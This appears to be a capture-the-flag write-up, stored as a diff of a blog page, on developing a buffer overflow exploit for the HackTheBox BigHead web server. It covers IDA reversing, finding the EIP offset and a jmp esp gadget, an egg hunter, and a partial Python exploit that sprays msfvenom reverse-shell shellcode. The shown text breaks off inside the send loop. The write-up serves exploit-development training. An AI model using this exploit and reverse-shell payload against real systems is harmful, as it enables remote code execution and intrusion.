@@ -1,0 +1,281 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" data-toc-skip="" itemprop="name headline">BigHead Exploit Dev</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-bighead">htb-bighead</a> <a class="post-tag" href="/tags#bof">bof</a> <a class="post-tag" href="/tags#exploit">exploit</a> <a class="post-tag" href="/tags#python">python</a> <a class="post-tag" href="/tags#pwntools">pwntools</a> <a class="post-tag" href="/tags#immunity">immunity</a> <a class="post-tag" href="/tags#mona">mona</a> <a class="post-tag" href="/tags#ida">ida</a> <a class="post-tag" href="/tags#reverse-engineering">reverse-engineering</a> <a class="post-tag" href="/tags#mingw">mingw</a> <a class="post-tag" href="/tags#nginx">nginx</a> <a class="post-tag" href="/tags#pattern-create">pattern-create</a> <a class="post-tag" href="/tags#egg-hunter">egg-hunter</a> </span><br/><br/>
+<time class="dt-published" datetime="2019-05-04T14:45:00+00:00" itemprop="datePublished">May 4, 2019
+    </time>
+</p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<ul class="nav navbar-nav"><li><a href="/2019/05/04/htb-bighead.html" style="color: #e6e6e6;">BigHead Walkthrough</a></li><li><a href="/2019/05/04/htb-bighead-bof.html" style="color: #e6e6e6;">BigHead Exploit Dev</a>
+<nav data-toggle="toc" id="toc"></nav></li>
+</ul>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<p><img alt="Bighead Bof Cover image" src="https://0xdfimages.gitlab.io/img/bighead-bof-cover.png" style="float: right;margin-right:50px; margin-left:50px; width:125px; height: 125px"> As my buffer overflow experience on Windows targets is relatively limited (only the basic vulnserver jmp esp type exploit previously), BigHeadWebSrv was probably the most complicate exploit chain I’ve written for a Windows target. The primary factor that takes this above something like a basic jmp esp is the space I have to write to is small. I got to learn a new technique, Egg Hunter, which is a small amount of code that will look for a marker I drop into memory earlier and run the shellcode after it.</img></p>
+<h2 id="reversing">Reversing</h2>
+<h3 id="strategy">Strategy</h3>
+<p>The most common and probably fastest way to find a vulnerability in a program like this would be fuzz it until you find a crash, and then continue to send input and look at the resulting crashes in something like <a href="https://www.immunityinc.com/products/debugger/">Immunity Debugger</a>. This is exactly what they teach in day 3 of <a href="https://www.sans.org/course/advanced-penetration-testing-exploits-ethical-hacking">Sans SEC660</a>. This is a fine strategy, especially if your goal is to move fast through binaries that may or may not have overflows in them. In this case, where I have a known vulnerable binary and I’m fairly confident there’s a bug in it (the note in the final git commit beyond just it’s being here on a HackTheBox host), I like practicing my reverse engineering, so before I even set up a Windows VM, I’m going to fire up <a href="https://www.hex-rays.com/products/ida/support/download_freeware.shtml">the free version of IDA</a> on Kali and see if I can find an overflow.</p>
+<h3 id="finding-connectionhandler">Finding ConnectionHandler</h3>
+<p>I want to find the function that handles web requests, since that the way that I can interact with the server. If I find an overflow in the handling of command line arguments, that doesn’t help me at this point, as I can’t control that. There are a few ways to find the function that IDA labels as <code class="language-plaintext highlighter-rouge">_ConnectionHandler@4</code>. I’ll show three simple ways that I did it.</p>
+<h4 id="strings">Strings</h4>
+<p>As soon as I open IDA, I’ll hit Shift-F12 to bring up the Strings window. About half way down, this block will jump out at me:</p>
+<p><img alt="1553943986408" src="https://0xdfimages.gitlab.io/img/1553943986408.png"/></p>
+<p>Those are clearly strings for parsing the HTTP request that’s incoming. That’s where my input with interact with the server, so I want to start there. I’ll pick <code class="language-plaintext highlighter-rouge">GET /coffee</code> since that’s the path that showed me the BigheadWebSrv in the first place.</p>
+<p>When I double click on it, I’m taken to where that string is in memory, with several other strings right around it, and I can see this string sits at 0x004077F3:</p>
+<p><img alt="1553944114173" src="https://0xdfimages.gitlab.io/img/1553944114173.png"/></p>
+<p>IDA is also showing me there’s an cross reference (code that references 0x004077F3) in <code class="language-plaintext highlighter-rouge">_ConnectionHandler@4</code>.</p>
+<p>If I click on <code class="language-plaintext highlighter-rouge">aGetCoffee</code> (it’ll highlight yellow) and then hit “x”, I’ll get a pop up with a list of places in the code this string is referenced:</p>
+<p><img alt="1553944359544" src="https://0xdfimages.gitlab.io/img/1553944359544.png"/></p>
+<p>In this case, it’s only once, so I’ll hit OK to go there in the code:</p>
+<p><img alt="1553944399173" src="https://0xdfimages.gitlab.io/img/1553944399173.png"/></p>
+<p>I’ll scroll up to the top of the function to see it’s been given the name <code class="language-plaintext highlighter-rouge">_ConnectionHandler@4</code> by IDA.</p>
+<h4 id="from-the-top">From the Top</h4>
+<p>Alternatively, when IDA loads, it starts me at <code class="language-plaintext highlighter-rouge">main</code>. I know this is a web server. So it’s likely going to create a socket, bind it to a post, listen, wait for connections, handle those connections by forking (in Windows that’s starting a thread). I see the overall flow of this function looks like this:</p>
+<p><img alt="1553944662084" src="https://0xdfimages.gitlab.io/img/1553944662084.png"/></p>
+<p>Without even looking at the assembly, I can make some guesses as to what’s going on.</p>
+<p><img alt="1553944708257" src="https://0xdfimages.gitlab.io/img/1553944708257.png"/></p>
+<p>If I scroll through the code itself, looking at the functions that are being called, I’ll see I basically got that right. I’ll also notice just after the args are processed, it prints a message with the server version and a warning that this software is vulnerable:</p>
+<p><img alt="1553945153807" src="https://0xdfimages.gitlab.io/img/1553945153807.png"/></p>
+<p>If I jump down to the section I have labeled in green in the image above, I’ll see the code that handles connections and the call to create a thread to handle the connection:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/bighead-ida-accept-loop.png"><img alt="Ida create thread to handle connection" src="https://0xdfimages.gitlab.io/img/bighead-ida-accept-loop.png"/><em>Click for full size image</em></a></p>
+<p>The thread is passed the offset to <code class="language-plaintext highlighter-rouge">_ConnectionHander@4</code> as the code to run.</p>
+<h4 id="functions-window">Functions Window</h4>
+<p>It’s also possible that I just look at the functions window and see the name IDA has give the function and guess that’s what handles the connection:</p>
+<p><img alt="1554116831557" src="https://0xdfimages.gitlab.io/img/1554116831557.png"/></p>
+<h3 id="handler-logic">Handler Logic</h3>
+<h4 id="overview">Overview</h4>
+<p>Now that I have the handler logic, I’ll try to understand it. Just like with <code class="language-plaintext highlighter-rouge">main</code>, I’ll start with the shape of the function and see if I can make a guess about what’s going on:</p>
+<p><img alt="Bighead Ida Handler Empty image" src="https://0xdfimages.gitlab.io/img/bighead-ida-handler-empty.png"/></p>
+<p>Immediately I see a bunch of comparisons (<code class="language-plaintext highlighter-rouge">if</code> statements), with a bunch of blocks at the end. I’ll guess that all those if statements are branching based on success/failure or <code class="language-plaintext highlighter-rouge">recv</code> and then different properties of the incoming HTTP request (GET vs POST, file exists, etc).</p>
+<p>Starting from the top, I can quickly scan through and get the logic. I’m not trying to understand every bit of assembly, but rather just looking for a generate idea of what is branching where, and what I can rule out as interesting. Here’s an annotated version of the flow from above, and what I see:</p>
+<p><img alt="Bighead Ida Handler Annotated image" src="https://0xdfimages.gitlab.io/img/bighead-ida-handler-annotated.png"/></p>
+<ul>
+<li>(a) Set up two buffers and set them to 0. If some error code is -1, print error at (b) and return at (c).</li>
+<li>(d) check that the last memset returned ok, or else return at (c).</li>
+<li>(e) <code class="language-plaintext highlighter-rouge">recv</code> up to 0x20c (524) bytes into the first of the buffers, and check the return code. If 0 or an error (negative), jump to (f). At (f), if <code class="language-plaintext highlighter-rouge">recv</code> returned 0, go to (g), print “Connection closing”, close socket, and go to (c) to return. Else, go to (h), print value of receive error, close socket, and go to (c) to return.</li>
+<li>Check the length of the data received at (i). If it’s shorter than 0xdb (219) bytes, go to (j), else go to (k).</li>
+<li>At (j), check if the first five bytes of the request are “HEAD “. If so, go into the section I’ve marked in green. Else, go to (k).</li>
+<li>At (k), now handling all requests except a HEAD under 219 bytes, check request to start with six bytes, “GET / “ (with space after “/”). If so, go to (l) and send the response with the image of the guy with the drink, clean up, and return at (c). Otherwise, go to (m).</li>
+<li>At (m), check if the request starts with “GET /coffee”. If it matches, send the 418 response with the teapot gif at (n), then clean up and return at (c). This explains why <code class="language-plaintext highlighter-rouge">dirsearch</code> returned the same for <code class="language-plaintext highlighter-rouge">/coffee</code>, <code class="language-plaintext highlighter-rouge">/coffeecat</code>, <code class="language-plaintext highlighter-rouge">/coffeebreak</code>, and <code class="language-plaintext highlighter-rouge">/coffeecup</code>.  Otherwise, go to (o).</li>
+<li>At (o), check if the request starts with “POST /”. If so, go to (p), which is exactly the same as (l), sending the guy with drink image. Otherwise, go to (q) and send a 404 message, clean up, and return at (c).</li>
+</ul>
+<p>Very quickly, I’ve been able to rule out anything in the above flow as risky.</p>
+<h4 id="short-head-requests">Short HEAD Requests</h4>
+<p>The remaining code (in green above) is called when there’s a HEAD request that’s less than 219 bytes long. I’ll just scan through this trying to get a high level idea of what it’s doing:</p>
+<p><img alt="Bighead Ida Head image" src="https://0xdfimages.gitlab.io/img/bighead-ida-head.png"/></p>
+<ul>
+<li>At (a), the few three bytes of the second buffer from the original initialization are set to 0. Then, a new 12 byte buffer is created. Finally, two counters are initialized (EBP-C and EPB-10). I’ll refer to them as i and j. i is set to 6, and j 0.</li>
+<li>Now in (b), it’s the top of a loop. The byte <code class="language-plaintext highlighter-rouge">i</code> bytes into the request is loaded, and if it’s null, the loop breaks to (e). Otherwise, continue to (c), where the byte <code class="language-plaintext highlighter-rouge">i+1</code> bytes into the request checked, and if null, the loop breaks (e). Otherwise, continue to (d).</li>
+<li>(d) has a bunch going on:
+<img alt="1554123846323" src="https://0xdfimages.gitlab.io/img/1554123846323.png"/>
+So, it’s converting from each two bytes from hex to a byte value, and storing it in a buffer on the heap. Then it goes back to the top of this local loop.</li>
+<li>At this point, I’m thinking I’m going to have a heap overflow here, as I can write well beyond the 12 bytes <code class="language-plaintext highlighter-rouge">malloced</code>. Still I’ll check out what happens once this loop completes, in (e).</li>
+<li>First, it calls <code class="language-plaintext highlighter-rouge">_Function4</code>, passing the new unhexed array as an argument. Then it sends the same 200 OK with guy with drink image, and prints some messages to the console. It moves on to (f), where it checks the return code from the send. If -1 (error), it goes to (g), prints more errors, cleans up, and returns. Otherwise, it goes back to the top of the loop and tries to read more.</li>
+</ul>
+<p>A quick look at <code class="language-plaintext highlighter-rouge">_Function4</code>:</p>
+<p><img alt="1554124836518" src="https://0xdfimages.gitlab.io/img/1554124836518.png"/></p>
+<p>It basically does an unsafe <code class="language-plaintext highlighter-rouge">strcpy</code> from the buffer I control into a address on the stack. This is a clear case for an overflow that will overwrite the return pointer of this function. Phew. I can avoid heap overflows for today.</p>
+<h2 id="build-target-vm">Build Target VM</h2>
+<p>With a clear vulnerability here, time to set up a VM and get it working.</p>
+<h3 id="windows">Windows</h3>
+<p>I know from the phpinfo that I need a 32-bit Server 2008 machine. I can download an iso <a href="https://www.microsoft.com/en-us/download/details.aspx?id=5023">from Microsoft</a>. I’ll create a new vm and install Windows from this iso.</p>
+<h3 id="libmingwex-0dll">libmingwex-0.dll</h3>
+<p>Now I get the exe and the dll from GitHub (or move it over from my Kali host), and try to run it:</p>
+<p><img alt="1554132912906" src="https://0xdfimages.gitlab.io/img/1554132912906.png"/></p>
+<p>I need to install <a href="http://www.mingw.org/">MinGW</a>, which is a development environment for Windows modeled after GNU.</p>
+<p>First, I’ll go to <a href="https://osdn.net/projects/mingw/releases">the MinGW releases page</a> and download the MinGW Installation Manager. On running that, I’ll have access to the manager to look for additional libraries. I’ll click on “MinGW Libraries”, scroll down to “mingw32-libmingwex” (the dll, not the dev), right click, and select “Mark for Installation”.</p>
+<p><img alt="1554133251853" src="https://0xdfimages.gitlab.io/img/1554133251853.png"/></p>
+<p>Then I’ll go to “Installation” –&gt; “Apply Changes”. After running that, I can see In the “Installed Files” tab the location of the dll that was missing:</p>
+<p><img alt="1554133333287" src="https://0xdfimages.gitlab.io/img/1554133333287.png"/></p>
+<p>Finally, I’ll need to add the new binary to my path. “Start” –&gt; right click on “Computer” –&gt; “Properties”. Click “Advanced System settings” –&gt; “Environment Variables”. I’ll find the variable “Path” in the “System Variables” section, click “Edit”, and add <code class="language-plaintext highlighter-rouge">%SystemRoot%\MinGW\bin\</code> to the end of the current value.</p>
+<p>Now I can run the server:</p>
+<p><img alt="1554133745377" src="https://0xdfimages.gitlab.io/img/1554133745377.png"/></p>
+<p>A quick netstat check shows it’s listening on 8008. I can get the page by pointing my browser at <code class="language-plaintext highlighter-rouge">127.0.0.1:8008</code> as well.</p>
+<h3 id="immunity">Immunity</h3>
+<p>My preferred debugger for Windows is x64dbg (and x32dbg), and I recently learned that there is a version of <code class="language-plaintext highlighter-rouge">mona</code> supposedly ported to work for it. I haven’t had a chance to play with that, so here I’ll go with <a href="https://www.immunityinc.com/products/debugger/">Immunity</a>. Download and install it. I’ll grab <a href="https://github.com/corelan/mona">mona</a> from GitHub and drop it into the “PyCommands” folder as instructed.</p>
+<h3 id="nginx">nginx</h3>
+<p>I’ll first build something talking directly to the <code class="language-plaintext highlighter-rouge">BigHeadWebSvr</code>, but once I’m done, I’ll run it over <code class="language-plaintext highlighter-rouge">nginx</code>, as that will filter some bad requests out if I’m not careful. I’ll install <code class="language-plaintext highlighter-rouge">nginx</code>, and get it running using the config from GitHub. The first time I solved this I remember this caused me a great deal of issues. But in going back now and resolving it, and I don’t remember exactly what those issues where. I’ll need to make sure I send a valid http request with a valid url, and a url that is routed to <code class="language-plaintext highlighter-rouge">BigHeadWebSrv</code>, or else nginx will filter it before it gets to BigHeadWebSrv.</p>
+<h2 id="exploit-parts">Exploit Parts</h2>
+<h3 id="find-eip-offset">Find EIP Offset</h3>
+<p>First I need to find the offset to EIP. Because my input is translated from hex to binary before it overwrites, I’ll send in my input hex encoded. So I’ll make a pattern using <code class="language-plaintext highlighter-rouge">msf-pattern_create</code>, and then use <code class="language-plaintext highlighter-rouge">xxd</code> and <code class="language-plaintext highlighter-rouge">tr</code> to get it formatted how I need it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>msf-pattern_create <span class="nt">-l</span> 50 | xxd <span class="nt">-p</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+<span class="go">41613041613141613241613341613441613541613641613741613841613941623041623141623241623341623441623541620a
+</span></code></pre></div></div>
+<p>I’ll fire up <code class="language-plaintext highlighter-rouge">BigHeadWedSvr.exe</code> and then attach Immunity to it. Note, sometimes to get Immunity to work, I’ll need to completely exit it, then start the web server, then start Immunity and attach. If I leave it open between runs, things get weird. Immunity isn’t the greatest.</p>
+<p>Now I’ll send my pattern:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">--head</span> http://10.1.1.146:8008/4161304161314161324161334161344161354161364161374161384161394162304162314162324162334162344162354162
+</code></pre></div></div>
+<p>In my Windows VM:</p>
+<p><img alt="1554139213884" src="https://0xdfimages.gitlab.io/img/1554139213884.png"/></p>
+<p>If I click ok and hit the run button, I’ll see EIP: <img alt="1554139238133" src="https://0xdfimages.gitlab.io/img/1554139238133.png"/></p>
+<p>Because of the weird way I’m putting in bytes as hex in the url, I’ll need to reverse the byte order to use pattern offset:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>msf-pattern_offset <span class="nt">-q</span> 41326241
+<span class="go">[*] Exact match at offset 36
+</span></code></pre></div></div>
+<p>So that’s 36 bytes, or 72 characters. I can verify (using 8 Bs to make 4 bytes):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">--head</span> http://10.1.1.146:8008/<span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print "A"*72 + "B"*8'</span><span class="si">)</span>
+</code></pre></div></div>
+<p><img alt="1554139443908" src="https://0xdfimages.gitlab.io/img/1554139443908.png"/></p>
+<h3 id="find-jmp-esp">Find JMP ESP</h3>
+<p>Next I’ll look for a <code class="language-plaintext highlighter-rouge">jmp esp</code> gadget so that I can jmp back to my code once I gain execution. I’ll check out the modules using <code class="language-plaintext highlighter-rouge">!mona modules</code>:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/1554139883147.png"><img alt="Mona Modules" src="https://0xdfimages.gitlab.io/img/1554139883147.png"/><em>Click for full size image</em></a></p>
+<p>I need to find the <code class="language-plaintext highlighter-rouge">jmp esp</code> inside of a module without ASLR, or else it doesn’t help me. Good options appear to be the exe itself, the associated dll, and the MinGW dll.</p>
+<p>I can use <code class="language-plaintext highlighter-rouge">!mona jmp -r esp</code> to find a list of possible gadgets:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/1554140320135.png"><img alt="Mona jmp esp" src="https://0xdfimages.gitlab.io/img/1554140320135.png"/><em>Click for full size image</em></a></p>
+<p>The first one looks fine, so I’ll go with 0x625012f0.</p>
+<p>I can give it a test. With a break point at 0x625012f0:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">--head</span> http://10.1.1.146:8008/<span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print "A"*72 + "f0125062" + "B"*8'</span><span class="si">)</span>
+</code></pre></div></div>
+<p>When it hits the break, I can see that my Bs are at ESP:</p>
+<p><img alt="1554141287373" src="https://0xdfimages.gitlab.io/img/1554141287373.png"/></p>
+<p>If I step forward, I see I’m running the Bs:</p>
+<p><img alt="1554141443675" src="https://0xdfimages.gitlab.io/img/1554141443675.png"/></p>
+<h3 id="egg-hunter">Egg Hunter</h3>
+<p>Space is an issue. I’ll remember that to get to the vulnerable code, I have to send a HEAD request that is shorter than 219 bytes. So the first 6 bytes are gone for “HEAD /”, and I need at least one “\n” on the end. Now I’m down to 212 bytes. So my buffer looks like:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"HEAD /" + [72 bytes] + [JMP ESP, 8 bytes] + [132 bytes] + "\n"
+</code></pre></div></div>
+<p>I don’t have a lot of space here, especially remembering that the 72 byte and 132 byte buffers are actually half those sizes because they take input in hex, which is 2 bytes per byte.</p>
+<p><code class="language-plaintext highlighter-rouge">msfvenom</code> stages reverse meterpreter is 351 bytes. Staged reverse shell is 341. The unstaged shell is down to 324. Still, none of these are close to small enough to fit here.</p>
+<p>This is where I’ll use an Egg Hunter. An Egg Hunter is a small bit of code that will search through memory for a specific string, and then jump to the code just after it. There are many pocs out there. <code class="language-plaintext highlighter-rouge">mona</code> has one built in, if I run <code class="language-plaintext highlighter-rouge">!mona egg -t 0xdf</code>:</p>
+<p><img alt="1554146083825" src="https://0xdfimages.gitlab.io/img/1554146083825.png"/></p>
+<p>I can use the 32-byte output there as my shellcode. But I still need a way to get my full payload into memory. The good news is that the memory isn’t reset or cleared between requests. So I can send a POST request with my payload, and it will likely still be in memory on my next request.</p>
+<h2 id="exploit">Exploit</h2>
+<p>After a bunch of trial and error, I ended up with this script (it’s not my most beautiful work):</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="mi">1</span> <span class="c1">#!/usr/bin/env python
+</span>  <span class="mi">2</span> 
+  <span class="mi">3</span> <span class="kn">import</span> <span class="n">os</span>
+  <span class="mi">4</span> <span class="kn">import</span> <span class="n">subprocess</span>
+  <span class="mi">5</span> <span class="kn">import</span> <span class="n">sys</span>
+  <span class="mi">6</span> 
+  <span class="mi">7</span> <span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+  <span class="mi">8</span> <span class="kn">from</span> <span class="n">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+  <span class="mi">9</span> 
+ <span class="mi">10</span> <span class="nf">context</span><span class="p">(</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">new-window</span><span class="sh">'</span><span class="p">])</span>
+ <span class="mi">11</span> <span class="nf">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="sh">'</span><span class="s">windows</span><span class="sh">'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="sh">"</span><span class="s">i386</span><span class="sh">"</span><span class="p">)</span>
+ <span class="mi">12</span> 
+ <span class="mi">13</span> 
+ <span class="mi">14</span> <span class="k">def</span> <span class="nf">clean_and_exit</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">files</span><span class="p">):</span>
+ <span class="mi">15</span>     <span class="nf">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+ <span class="mi">16</span>     <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
+ <span class="mi">17</span>         <span class="k">try</span><span class="p">:</span>
+ <span class="mi">18</span>             <span class="n">os</span><span class="p">.</span><span class="nf">remove</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+ <span class="mi">19</span>         <span class="k">except</span><span class="p">:</span>
+ <span class="mi">20</span>             <span class="k">pass</span>
+ <span class="mi">21</span>     <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+ <span class="mi">22</span> 
+ <span class="mi">23</span> 
+ <span class="mi">24</span> <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">5</span><span class="p">:</span>
+ <span class="mi">25</span>     <span class="nf">clean_and_exit</span><span class="p">(</span><span class="sh">"</span><span class="s">%s [target] [target port] [callback ip] [callback port]</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span> <span class="p">[])</span>
+ <span class="mi">26</span> 
+ <span class="mi">27</span> <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+ <span class="mi">28</span> <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+ <span class="mi">29</span> <span class="n">cb_ip</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+ <span class="mi">30</span> <span class="n">cb_port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
+ <span class="mi">31</span> 
+ <span class="mi">32</span> <span class="c1"># Generate Shellcode 
+</span> <span class="mi">33</span> <span class="n">msfvenom_string</span> <span class="o">=</span> <span class="sh">'</span><span class="s">msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s EXIT_FUNC=THREAD -a x86 --platform windows -b </span><span class="sh">"</span><span class="se">\\</span><span class="s">x00</span><span class="se">\\</span><span class="s">x0a</span><span class="se">\\</span><span class="s">x0d</span><span class="sh">"</span><span class="s"> -f python -v shellcode -o sc.py</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">cb_ip</span><span class="p">,</span> <span class="n">cb_port</span><span class="p">)</span>
+ <span class="mi">34</span> <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Generating shellcode:</span><span class="se">\n</span><span class="s">    %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">msfvenom_string</span><span class="p">)</span>
+ <span class="mi">35</span> <span class="n">p</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nc">Popen</span><span class="p">(</span><span class="n">msfvenom_string</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">),</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">)</span>
+ <span class="mi">36</span> <span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">communicate</span><span class="p">()</span>
+ <span class="mi">37</span> 
+ <span class="mi">38</span> <span class="k">try</span><span class="p">:</span>
+ <span class="mi">39</span>     <span class="k">if</span> <span class="sh">"</span><span class="s">Error</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">err</span><span class="p">:</span>
+ <span class="mi">40</span>         <span class="k">raise</span> <span class="nc">Exception</span><span class="p">(</span><span class="sh">"</span><span class="s">[-] Unable to generate shellcode</span><span class="se">\n</span><span class="s">    %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">err</span><span class="p">)</span>
+ <span class="mi">41</span>     <span class="kn">from</span> <span class="n">sc</span> <span class="kn">import</span> <span class="n">shellcode</span>
+ <span class="mi">42</span> <span class="nf">except </span><span class="p">(</span><span class="nb">NameError</span><span class="p">,</span> <span class="nb">Exception</span><span class="p">)</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+ <span class="mi">43</span>     <span class="nf">clean_and_exit</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">message</span><span class="p">,</span> <span class="p">[</span><span class="sh">'</span><span class="s">sc.py</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">sc.pyc</span><span class="sh">'</span><span class="p">])</span>
+ <span class="mi">44</span> 
+ <span class="mi">45</span> <span class="k">print</span> <span class="sh">"</span><span class="s">[+] Shellcode generated successfully</span><span class="sh">"</span>
+ <span class="mi">46</span> <span class="n">os</span><span class="p">.</span><span class="nf">remove</span><span class="p">(</span><span class="sh">'</span><span class="s">sc.py</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">47</span> <span class="n">os</span><span class="p">.</span><span class="nf">remove</span><span class="p">(</span><span class="sh">'</span><span class="s">sc.pyc</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">48</span> 
+ <span class="mi">49</span> <span class="c1"># !mona egg -t
+</span> <span class="mi">50</span> <span class="n">egg</span> <span class="o">=</span> <span class="sh">'</span><span class="s">0xdf</span><span class="sh">'</span>
+ <span class="mi">51</span> <span class="n">egghunter</span> <span class="o">=</span> <span class="sh">"</span><span class="s">6681caff0f42526a0258cd2e3c055a74efb8</span><span class="sh">"</span> <span class="o">+</span> <span class="n">egg</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">hex</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="sh">"</span><span class="s">8bfaaf75eaaf75e7ffe7</span><span class="sh">"</span>
+ <span class="mi">52</span> 
+ <span class="mi">53</span> <span class="n">nops</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span><span class="o">*</span><span class="mi">16</span>
+ <span class="mi">54</span> <span class="n">spray</span> <span class="o">=</span> <span class="n">egg</span> <span class="o">+</span> <span class="n">egg</span> <span class="o">+</span> <span class="n">nops</span> <span class="o">+</span> <span class="n">shellcode</span>
+ <span class="mi">55</span> <span class="n">post</span> <span class="o">=</span> <span class="sh">'</span><span class="s">POST / HTTP/1.1</span><span class="se">\r\n</span><span class="s">Host: dev.bighead.htb</span><span class="se">\r\n</span><span class="s">Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s">Content-Length: {}</span><span class="se">\r\n\r\n</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">spray</span><span class="p">))</span>
+ <span class="mi">56</span> <span class="n">spray_payload</span> <span class="o">=</span> <span class="n">post</span> <span class="o">+</span> <span class="n">spray</span>
+ <span class="mi">57</span> 
+ <span class="mi">58</span> <span class="n">head</span> <span class="o">=</span> <span class="sh">"</span><span class="s">HEAD /</span><span class="sh">"</span>
+ <span class="mi">59</span> <span class="n">junk</span> <span class="o">=</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">78</span><span class="o">-</span><span class="nf">len</span><span class="p">(</span><span class="n">head</span><span class="p">))</span>
+ <span class="mi">60</span> <span class="n">jmp_esp</span> <span class="o">=</span> <span class="sh">"</span><span class="s">f0125062</span><span class="sh">"</span> <span class="c1">#p32(0x625012f0)
+</span> <span class="mi">61</span> <span class="n">host</span> <span class="o">=</span> <span class="sh">"</span><span class="s"> HTTP/1.1</span><span class="se">\r\n</span><span class="s">Host: dev.bighead.htb</span><span class="se">\r\n\r\n</span><span class="sh">"</span>
+ <span class="mi">62</span> <span class="n">exec_payload</span> <span class="o">=</span> <span class="n">head</span> <span class="o">+</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">jmp_esp</span> <span class="o">+</span> <span class="n">egghunter</span> <span class="o">+</span> <span class="n">host</span>
+ <span class="mi">63</span> 
+ <span class="mi">64</span> <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Sending payload 5 times</span><span class="sh">"</span><span class="p">)</span>
+ <span class="mi">65</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+ <span class="mi">66</span>     <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+ <span class="mi">67</span>     <span class="c1">#print(spray_payload)
